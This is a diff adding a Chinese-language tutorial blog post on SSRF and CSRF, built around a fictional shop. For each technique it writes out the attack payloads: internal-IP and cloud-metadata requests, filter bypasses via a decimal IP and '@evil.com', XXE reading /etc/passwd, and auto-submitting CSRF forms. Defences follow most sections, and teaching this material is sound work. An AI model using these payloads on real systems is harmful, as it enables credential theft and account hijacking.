@@ -126,6 +126,957 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="Server-Side Request Forgery (SSRF)-Server-SideRequestForgery" class="article article-type-Server-Side Request Forgery (SSRF)" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/05/07/Server-SideRequestForgery/" class="article-date">
+  	<time datetime="2025-05-06T17:47:32.932Z" itemprop="datePublished">2025-05-07</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2025/05/07/Server-SideRequestForgery/">
+        Server-Side Request Forgery (SSRF)
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Server-Side-Request-Forgery-SSRF-與-Cross-Site-Request-Forgery-CSRF-：從入門到進階，涵蓋-OWASP-Top-10-相關攻擊手法"><a href="#Server-Side-Request-Forgery-SSRF-與-Cross-Site-Request-Forgery-CSRF-：從入門到進階，涵蓋-OWASP-Top-10-相關攻擊手法" class="headerlink" title="Server-Side Request Forgery (SSRF) 與 Cross-Site Request Forgery (CSRF)：從入門到進階，涵蓋 OWASP Top 10 相關攻擊手法"></a>Server-Side Request Forgery (SSRF) 與 Cross-Site Request Forgery (CSRF)：從入門到進階，涵蓋 OWASP Top 10 相關攻擊手法</h1><h2 id="簡介-Introduction"><a href="#簡介-Introduction" class="headerlink" title="簡介 &#x2F; Introduction"></a>簡介 &#x2F; Introduction</h2><p><strong>Server-Side Request Forgery</strong>（<strong>SSRF</strong>，伺服器端請求偽造）和 <strong>Cross-Site Request Forgery</strong>（<strong>CSRF</strong>，跨站請求偽造）是兩種常見的網頁安全漏洞，均屬於 <strong>OWASP Top 10</strong> 關注的風險範疇。它們允許攻擊者誘導應用程式執行未授權的 <strong>HTTP requests</strong>（HTTP 請求），可能導致 <strong>data leakage</strong>（資料洩露）、<strong>privilege escalation</strong>（權限提升）或 <strong>remote code execution</strong>（遠程程式碼執行）。雖然 <strong>SSRF</strong> 和 <strong>CSRF</strong> 名稱相似，但它們的運作機制、攻擊目標和防禦策略截然不同。</p>
+<p><strong>中文解釋</strong>：<br>想像你的網頁應用程式是一間銀行，<strong>SSRF</strong> 是壞人騙銀行內部員工（伺服器）去拿機密文件（內部資源）；<strong>CSRF</strong> 是壞人騙你（已登入的用戶）在不知情下簽署一張轉帳單（執行操作）。這兩種攻擊都很危險，但方式不同。</p>
+<p>本文將深入探討 <strong>SSRF</strong> 和 <strong>CSRF</strong>，針對新手詳細解釋每個專業術語，並以一家虛擬電商平台（ShopEasy）為統一情境，展示所有與 <strong>OWASP Top 10</strong> 相關的攻擊手法。我們將涵蓋基礎知識、攻擊技術、防禦策略，並明確區分 <strong>SSRF</strong> 與 <strong>CSRF</strong> 的差異。文章以 <strong>Markdown</strong> 格式撰寫，中文部分使用繁體中文，參考但不直接複製提供的資料，確保內容深入且易懂。</p>
+<hr>
+<h2 id="SSRF-與-CSRF-的基礎-Basics-of-SSRF-and-CSRF"><a href="#SSRF-與-CSRF-的基礎-Basics-of-SSRF-and-CSRF" class="headerlink" title="SSRF 與 CSRF 的基礎 &#x2F; Basics of SSRF and CSRF"></a>SSRF 與 CSRF 的基礎 &#x2F; Basics of SSRF and CSRF</h2><h3 id="什麼是-SSRF？-What-is-Server-Side-Request-Forgery"><a href="#什麼是-SSRF？-What-is-Server-Side-Request-Forgery" class="headerlink" title="什麼是 SSRF？ &#x2F; What is Server-Side Request Forgery?"></a>什麼是 SSRF？ &#x2F; What is Server-Side Request Forgery?</h3><p><strong>Server-Side Request Forgery</strong>（<strong>SSRF</strong>）是一種安全漏洞，允許攻擊者誘導伺服器端應用程式向非預期的目標發送 <strong>HTTP requests</strong>（HTTP 請求）。這些目標可能是：</p>
+<ul>
+<li>組織內部的 <strong>internal services</strong>（內部服務），如管理介面或資料庫。</li>
+<li>外部的任意系統，可能洩露敏感資料或觸發惡意操作。</li>
+</ul>
+<p><strong>原理</strong>：<br><strong>SSRF</strong> 利用應用程式對用戶輸入（如 <strong>URLs</strong>）的信任，誘導伺服器發送請求。攻擊者通常通過操控 <strong>request parameters</strong>（請求參數）或 <strong>headers</strong>（標頭）來指定目標 <strong>URL</strong>。</p>
+<p><strong>中文解釋</strong>：<br><strong>SSRF</strong> 就像壞人騙銀行的內部員工（伺服器）去檔案室拿機密文件（內部資源），或去壞人的網站偷資料。伺服器以為這是正常工作，但其實被利用了。</p>
+<h3 id="什麼是-CSRF？-What-is-Cross-Site-Request-Forgery"><a href="#什麼是-CSRF？-What-is-Cross-Site-Request-Forgery" class="headerlink" title="什麼是 CSRF？ &#x2F; What is Cross-Site Request Forgery?"></a>什麼是 CSRF？ &#x2F; What is Cross-Site Request Forgery?</h3><p><strong>Cross-Site Request Forgery</strong>（<strong>CSRF</strong>）是一種攻擊，誘導已通過身份驗證的用戶在不知情的情況下，向應用程式發送惡意的 <strong>HTTP requests</strong>（HTTP 請求）。這些請求通常執行敏感操作，如更改密碼或轉帳。</p>
+<p><strong>原理</strong>：<br><strong>CSRF</strong> 利用瀏覽器的 <strong>session cookies</strong>（會話 cookie），當用戶訪問惡意網站時，瀏覽器自動附加 <strong>cookies</strong>，使請求看似合法。攻擊者通過 <strong>HTML forms</strong>（表單）或 <strong>JavaScript</strong> 觸發請求。</p>
+<p><strong>中文解釋</strong>：<br><strong>CSRF</strong> 就像壞人寄給你一封假郵件，騙你點擊一個按鈕，結果你的銀行帳戶自動轉帳，因為你已經登入了銀行網站，瀏覽器以為這是你自己的操作。</p>
+<h3 id="SSRF-與-CSRF-的核心區別-Key-Differences-Between-SSRF-and-CSRF"><a href="#SSRF-與-CSRF-的核心區別-Key-Differences-Between-SSRF-and-CSRF" class="headerlink" title="SSRF 與 CSRF 的核心區別 &#x2F; Key Differences Between SSRF and CSRF"></a>SSRF 與 CSRF 的核心區別 &#x2F; Key Differences Between SSRF and CSRF</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th><strong>SSRF</strong></th>
+<th><strong>CSRF</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>攻擊目標</strong></td>
+<td>伺服器端應用程式，誘導發送 <strong>HTTP requests</strong> 到非預期目標</td>
+<td>已登入的用戶，誘導瀏覽器發送惡意 <strong>HTTP requests</strong></td>
+</tr>
+<tr>
+<td><strong>執行主體</strong></td>
+<td>伺服器（<strong>server-side</strong>）</td>
+<td>客戶端（<strong>client-side</strong>，用戶的瀏覽器）</td>
+</tr>
+<tr>
+<td><strong>依賴條件</strong></td>
+<td>用戶可控制的輸入（如 <strong>URLs</strong>）</td>
+<td>用戶已通過 <strong>authentication</strong>（身份驗證）</td>
+</tr>
+<tr>
+<td><strong>常見影響</strong></td>
+<td><strong>Data leakage</strong>（資料洩露）、<strong>internal network reconnaissance</strong>（內網偵察）、<strong>remote code execution</strong></td>
+<td><strong>Unauthorized actions</strong>（未授權操作，如轉帳、更改資料）</td>
+</tr>
+<tr>
+<td><strong>防禦重點</strong></td>
+<td>驗證和限制伺服器端 <strong>URLs</strong></td>
+<td>使用 <strong>CSRF tokens</strong>（CSRF 令牌）防止未授權請求</td>
+</tr>
+</tbody></table>
+<p><strong>中文解釋</strong>：<br><strong>SSRF</strong> 是騙銀行的電腦（伺服器）去幹壞事；<strong>CSRF</strong> 是騙你的瀏覽器（客戶端）幫壞人做事。<strong>SSRF</strong> 更像內部入侵，<strong>CSRF</strong> 像假冒你的身份。</p>
+<hr>
+<h2 id="統一情境：ShopEasy-電商平台-Unified-Scenario-ShopEasy-E-Commerce-Platform"><a href="#統一情境：ShopEasy-電商平台-Unified-Scenario-ShopEasy-E-Commerce-Platform" class="headerlink" title="統一情境：ShopEasy 電商平台 &#x2F; Unified Scenario: ShopEasy E-Commerce Platform"></a>統一情境：ShopEasy 電商平台 &#x2F; Unified Scenario: ShopEasy E-Commerce Platform</h2><p>我們設定一個情境：ShopEasy 是一家線上購物平台，允許用戶瀏覽商品、購買產品、管理帳戶和查看庫存。平台使用 <strong>RESTful API</strong> 提供功能，資料以 <strong>JSON</strong> 格式傳輸。功能包括：</p>
+<ul>
+<li><strong>Product Catalog</strong>（產品目錄）：顯示商品資訊和庫存狀態。</li>
+<li><strong>User Account</strong>（用戶帳戶）：管理個人資料、訂單和密碼。</li>
+<li><strong>Stock Check API</strong>（庫存檢查 API）：查詢商品在特定商店的庫存。</li>
+<li><strong>Admin Panel</strong>（管理面板）：管理員可管理商品和用戶。</li>
+</ul>
+<p><strong>漏洞</strong>：</p>
+<ul>
+<li><strong>Stock Check API</strong> 接受用戶提供的 <strong>URLs</strong>，未嚴格驗證。</li>
+<li><strong>CSRF</strong> 防護不足，敏感操作缺乏 <strong>CSRF tokens</strong>。</li>
+<li>內部系統（如管理介面）使用私有 IP（如 <code>192.168.0.1</code>），可通過 <strong>SSRF</strong> 訪問。</li>
+<li><strong>API documentation</strong> 公開，暴露隱藏端點。</li>
+</ul>
+<p>以下將以 ShopEasy 為例，展示所有與 <strong>OWASP Top 10</strong> 相關的 <strong>SSRF</strong> 和 <strong>CSRF</strong> 攻擊手法。</p>
+<hr>
+<h2 id="OWASP-Top-10-相關攻擊手法-Attack-Techniques-Related-to-OWASP-Top-10"><a href="#OWASP-Top-10-相關攻擊手法-Attack-Techniques-Related-to-OWASP-Top-10" class="headerlink" title="OWASP Top 10 相關攻擊手法 &#x2F; Attack Techniques Related to OWASP Top 10"></a>OWASP Top 10 相關攻擊手法 &#x2F; Attack Techniques Related to OWASP Top 10</h2><p><strong>OWASP Top 10</strong> 涵蓋了網頁應用程式的主要安全風險，<strong>SSRF</strong> 和 <strong>CSRF</strong> 與多個風險相關（如 <strong>Security Misconfiguration</strong>、<strong>Broken Access Control</strong>）。以下詳細介紹 <strong>SSRF</strong> 和 <strong>CSRF</strong> 的攻擊手法，涵蓋所有可能的利用方式。</p>
+<h3 id="攻擊手法-1：SSRF-攻擊本地伺服器-SSRF-Attacks-Against-the-Local-Server"><a href="#攻擊手法-1：SSRF-攻擊本地伺服器-SSRF-Attacks-Against-the-Local-Server" class="headerlink" title="攻擊手法 1：SSRF 攻擊本地伺服器 &#x2F; SSRF Attacks Against the Local Server"></a>攻擊手法 1：SSRF 攻擊本地伺服器 &#x2F; SSRF Attacks Against the Local Server</h3><p><strong>定義</strong>：<br>攻擊者誘導應用程式向本地伺服器發送 <strong>HTTP requests</strong>，通常使用 <strong>loopback addresses</strong>（回環地址，如 <code>127.0.0.1</code> 或 <code>localhost</code>），繞過 <strong>access controls</strong>（存取控制）。</p>
+<p><strong>原理</strong>：<br>應用程式可能對來自本地的請求給予更高信任，允許訪問敏感功能（如管理介面）。攻擊者通過操控 <strong>URL</strong> 參數，誘導伺服器訪問本地資源。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者利用 <strong>Stock Check API</strong> 訪問本地管理介面。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>訪問管理介面</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://localhost:8080/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器訪問 <code>http://localhost:8080/admin</code>，返回管理介面內容。</li>
+</ul>
+</li>
+<li><p><strong>繞過認證</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://127.0.0.1:8080/admin/users</span><br></pre></td></tr></table></figure>
+<ul>
+<li>由於請求來自本地，伺服器繞過 <strong>authentication</strong>，洩露用戶資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像騙銀行的電腦去自己的機密檔案室（<code>localhost</code>）拿資料，因為電腦以為這是內部請求，就沒檢查身份。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁止 <strong>loopback addresses</strong>（如 <code>127.0.0.1</code>、<code>localhost</code>）作為 <strong>URL</strong> 輸入。</li>
+<li>對所有請求實施一致的 <strong>access controls</strong>。</li>
+<li>使用 <strong>network segmentation</strong>（網路分段）隔離敏感服務。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-2：SSRF-攻擊內部後端系統-SSRF-Attacks-Against-Internal-Back-End-Systems"><a href="#攻擊手法-2：SSRF-攻擊內部後端系統-SSRF-Attacks-Against-Internal-Back-End-Systems" class="headerlink" title="攻擊手法 2：SSRF 攻擊內部後端系統 &#x2F; SSRF Attacks Against Internal Back-End Systems"></a>攻擊手法 2：SSRF 攻擊內部後端系統 &#x2F; SSRF Attacks Against Internal Back-End Systems</h3><p><strong>定義</strong>：<br>攻擊者誘導伺服器向內部 <strong>non-routable</strong>（不可路由）系統發送 <strong>HTTP requests</strong>，存取通常無法直接訪問的資源。</p>
+<p><strong>原理</strong>：<br>內部系統（如資料庫、管理介面）使用私有 IP（如 <code>192.168.0.1</code>），通常缺乏嚴格的 <strong>authentication</strong>。<strong>SSRF</strong> 允許攻擊者通過伺服器作為代理訪問這些系統。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者利用 <strong>Stock Check API</strong> 訪問內部管理伺服器。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部管理介面</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://192.168.0.68:8080/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器訪問內部管理介面，洩露敏感資料。</li>
+</ul>
+</li>
+<li><p><strong>雲端元資料</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://169.254.169.254/latest/meta-data/</span><br></pre></td></tr></table></figure>
+<ul>
+<li>獲取 AWS 雲端伺服器的 <strong>instance metadata</strong>（實例元資料），包括 <strong>IAM credentials</strong>（身份憑證）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像騙銀行的電腦去地下室的秘密伺服器（內部系統）偷資料，因為地下室沒鎖，壞人輕鬆得手。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁止私有 IP 範圍（如 <code>192.168.0.0/16</code>、<code>10.0.0.0/8</code>）作為 <strong>URL</strong> 輸入。</li>
+<li>在內部系統上實施 <strong>authentication</strong> 和 <strong>access controls</strong>。</li>
+<li>使用 <strong>firewall</strong>（防火牆）限制伺服器對內網的訪問。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-3：Blind-SSRF（盲-SSRF）"><a href="#攻擊手法-3：Blind-SSRF（盲-SSRF）" class="headerlink" title="攻擊手法 3：Blind SSRF（盲 SSRF）"></a>攻擊手法 3：Blind SSRF（盲 SSRF）</h3><p><strong>定義</strong>：<br><strong>Blind SSRF</strong> 是指攻擊者可誘導伺服器發送 <strong>HTTP requests</strong>，但無法直接看到回應內容，屬於 <strong>out-of-band</strong>（頻外）攻擊。</p>
+<p><strong>原理</strong>：<br>攻擊者通過 <strong>DNS lookups</strong>（DNS 查詢）或 <strong>network interactions</strong>（網路互動）確認漏洞存在，並可能利用 <strong>client-side vulnerabilities</strong>（客戶端漏洞）或 <strong>server-side vulnerabilities</strong>（伺服器端漏洞）進一步攻擊。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者使用 <strong>Burp Collaborator</strong> 檢測 <strong>Blind SSRF</strong>，並嘗試觸發其他漏洞。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>檢測 Blind SSRF</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Burp Collaborator</strong> 記錄 <strong>DNS lookup</strong> 或 <strong>HTTP request</strong>，證明存在 <strong>Blind SSRF</strong>。</li>
+</ul>
+</li>
+<li><p><strong>利用 Shellshock</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://192.168.0.68/cgi-bin/status.sh</span><br></pre></td></tr></table></figure>
+<ul>
+<li>內部系統運行未修補的 <strong>Shellshock</strong> 漏洞，執行任意命令。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人讓銀行的電腦打電話給壞人的號碼（<strong>Burp Collaborator</strong>），雖然看不到回話內容，但知道電話打通了，然後利用漏洞搞亂系統。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用 <strong>outbound firewall</strong>（出站防火牆）限制未知 <strong>DNS</strong> 和 <strong>HTTP</strong> 請求。</li>
+<li>定期修補內部系統的已知漏洞（如 <strong>Shellshock</strong>）。</li>
+<li>監控異常的 <strong>network traffic</strong>（網路流量）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-4：SSRF-繞過過濾器-Bypassing-SSRF-Filters"><a href="#攻擊手法-4：SSRF-繞過過濾器-Bypassing-SSRF-Filters" class="headerlink" title="攻擊手法 4：SSRF 繞過過濾器 &#x2F; Bypassing SSRF Filters"></a>攻擊手法 4：SSRF 繞過過濾器 &#x2F; Bypassing SSRF Filters</h3><p><strong>定義</strong>：<br>攻擊者使用技術繞過 <strong>blacklist</strong>（黑名單）或 <strong>whitelist</strong>（白名單）過濾器，誘導伺服器訪問受限 <strong>URLs</strong>。</p>
+<p><strong>原理</strong>：<br>應用程式可能對 <strong>URLs</strong> 實施過濾（如禁止 <code>localhost</code>），但攻擊者可通過 <strong>URL encoding</strong>（URL 編碼）、<strong>alternative IP representations</strong>（替代 IP 表示）或 <strong>open redirection</strong>（開放重定向）繞過。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者使用各種 <strong>payloads</strong> 繞過 <strong>Stock Check API</strong> 的 <strong>URL</strong> 過濾。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>Blacklist 繞過</strong>：  </p>
+<ul>
+<li>原始過濾器禁止 <code>127.0.0.1</code> 和 <code>localhost</code>。</li>
+<li>攻擊者發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://2130706433/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>2130706433</code> 是 <code>127.0.0.1</code> 的十進位表示，繞過過濾。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>Whitelist 繞過</strong>：  </p>
+<ul>
+<li>過濾器僅允許 <code>shopeasy.com</code>。</li>
+<li>攻擊者發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=https://shopeasy.com@evil.com/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 <code>@</code> 嵌入憑證，誘導訪問 <code>evil.com</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>Open Redirection 繞過</strong>：  </p>
+<ul>
+<li>ShopEasy 存在 <strong>open redirection</strong> 漏洞：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product/next?path=http://evil.com</span><br></pre></td></tr></table></figure></li>
+<li>攻擊者發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /product/stock HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">stockApi=http://shopeasy.com/product/next?path=http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>重定向到內部管理介面。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人用化名（<code>2130706433</code>）或假地址（<code>shopeasy.com@evil.com</code>）騙過銀行的門禁，進到機密檔案室。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>使用嚴格的 <strong>URL parsing</strong>（URL 解析）庫，檢查完整 <strong>URL</strong>。</li>
+<li>禁止重定向到非預期 <strong>URLs</strong>。</li>
+<li>使用 <strong>whitelist</strong> 限制允許的域名，並驗證 <strong>DNS resolution</strong>（DNS 解析）。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-5：SSRF-通過-XML-External-Entity-XXE-SSRF-via-XML-External-Entity-XXE"><a href="#攻擊手法-5：SSRF-通過-XML-External-Entity-XXE-SSRF-via-XML-External-Entity-XXE" class="headerlink" title="攻擊手法 5：SSRF 通過 XML External Entity (XXE) &#x2F; SSRF via XML External Entity (XXE)"></a>攻擊手法 5：SSRF 通過 XML External Entity (XXE) &#x2F; SSRF via XML External Entity (XXE)</h3><p><strong>定義</strong>：<br>攻擊者利用 <strong>XML External Entity</strong>（<strong>XXE</strong>）漏洞，在 <strong>XML</strong> 資料解析時誘導伺服器發送 <strong>HTTP requests</strong>，實現 <strong>SSRF</strong>。</p>
+<p><strong>原理</strong>：<br><strong>XXE</strong> 允許攻擊者在 <strong>XML</strong> 中定義外部實體（如 <strong>URLs</strong>），伺服器解析時會訪問這些 <strong>URLs</strong>，可能導致 <strong>SSRF</strong>。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者上傳惡意 <strong>XML</strong> 檔案，誘導伺服器訪問內部系統。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部系統訪問</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/xml HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.0.68/admin&quot;&gt;]&gt;</span><br><span class="line">&lt;data&gt;&amp;xxe;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器解析 <strong>XML</strong>，訪問內部管理介面。</li>
+</ul>
+</li>
+<li><p><strong>資料洩露</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/upload/xml HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;data&gt;&amp;xxe;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>伺服器返回 <code>/etc/passwd</code> 內容，結合 <strong>SSRF</strong> 洩露資料。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人在上傳的檔案（<strong>XML</strong>）裡藏了一個命令，騙銀行的電腦去拿機密資料或內部文件。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>禁用 <strong>XML</strong> 外部實體解析（設置 <code>disable_entity_loader</code> 或禁用 <code>resolveExternals</code>）。</li>
+<li>使用 <strong>JSON</strong> 或其他安全的資料格式。</li>
+<li>驗證和清理上傳的 <strong>XML</strong> 內容。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-6：SSRF-通過-Referer-Header-SSRF-via-Referer-Header"><a href="#攻擊手法-6：SSRF-通過-Referer-Header-SSRF-via-Referer-Header" class="headerlink" title="攻擊手法 6：SSRF 通過 Referer Header &#x2F; SSRF via Referer Header"></a>攻擊手法 6：SSRF 通過 Referer Header &#x2F; SSRF via Referer Header</h3><p><strong>定義</strong>：<br>攻擊者通過操控 <strong>Referer header</strong>（參考來源標頭），誘導伺服器端的分析軟體訪問惡意 <strong>URLs</strong>，實現 <strong>SSRF</strong>。</p>
+<p><strong>原理</strong>：<br>某些應用程式使用分析軟體記錄 <strong>Referer header</strong>，並訪問其中的 <strong>URLs</strong>（如檢查來源網站）。攻擊者可注入惡意 <strong>URLs</strong>。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者通過 <strong>Referer header</strong> 誘導伺服器訪問內部系統。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>內部系統訪問</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product/123 HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Referer: http://192.168.0.68/admin</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分析軟體訪問內部管理介面，洩露資料。</li>
+</ul>
+</li>
+<li><p><strong>Blind SSRF 檢測</strong>：<br>攻擊者發送：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /product/123 HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Referer: http://xyz.burpcollaborator.net</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>Burp Collaborator</strong> 記錄互動，證明漏洞。</li>
+</ul>
+</li>
+</ol>
+<p><strong>中文解釋</strong>：<br>這就像壞人在銀行的訪客紀錄（<strong>Referer header</strong>）寫上假地址，騙銀行的電腦去那個地址拿資料。</p>
+<p><strong>防禦</strong>：  </p>
+<ul>
+<li>驗證 <strong>Referer header</strong> 中的 <strong>URLs</strong>，僅允許可信域名。</li>
+<li>禁用分析軟體對 <strong>Referer URLs</strong> 的自動訪問。</li>
+<li>使用 <strong>WAF</strong> 過濾惡意 <strong>headers</strong>。</li>
+</ul>
+<hr>
+<h3 id="攻擊手法-7：CSRF-攻擊敏感操作-CSRF-Attacks-on-Sensitive-Operations"><a href="#攻擊手法-7：CSRF-攻擊敏感操作-CSRF-Attacks-on-Sensitive-Operations" class="headerlink" title="攻擊手法 7：CSRF 攻擊敏感操作 &#x2F; CSRF Attacks on Sensitive Operations"></a>攻擊手法 7：CSRF 攻擊敏感操作 &#x2F; CSRF Attacks on Sensitive Operations</h3><p><strong>定義</strong>：<br>攻擊者誘導已登入的用戶發送惡意 <strong>HTTP requests</strong>，執行敏感操作，如更改密碼或刪除帳戶。</p>
+<p><strong>原理</strong>：<br><strong>CSRF</strong> 利用瀏覽器的 <strong>session cookies</strong>，當用戶訪問惡意網站時，瀏覽器自動附加 <strong>cookies</strong>，使請求看似合法。</p>
+<p><strong>ShopEasy 攻擊方法</strong>：<br>攻擊者創建惡意網站，誘導用戶更改帳戶密碼。</p>
+<p><strong>範例</strong>：  </p>
+<ol>
+<li><p><strong>更改密碼</strong>：<br>攻擊者創建惡意頁面：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://shopeasy.com/api/account/update&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacked123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Click Me!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>用戶點擊或頁面自動提交，發送：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /api/account/update HTTP/1.1</span><br><span class="line">Host: shopeasy.com</span><br><span class="line">Cookie: session=abc123</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">password=hacked123</span><br></pre></td></tr></table></figure></li>
+<li>更改用戶密碼。</li>
+</ul>
+</li>
+<li><p><strong>刪除帳戶</strong>：<br>攻擊者創建：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://shopeasy.com/api/account/delete&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>瀏覽器發送 <strong>GET</strong> 請求，刪除用戶帳戶。</li>
+</ul>
+</li>
+</ol>
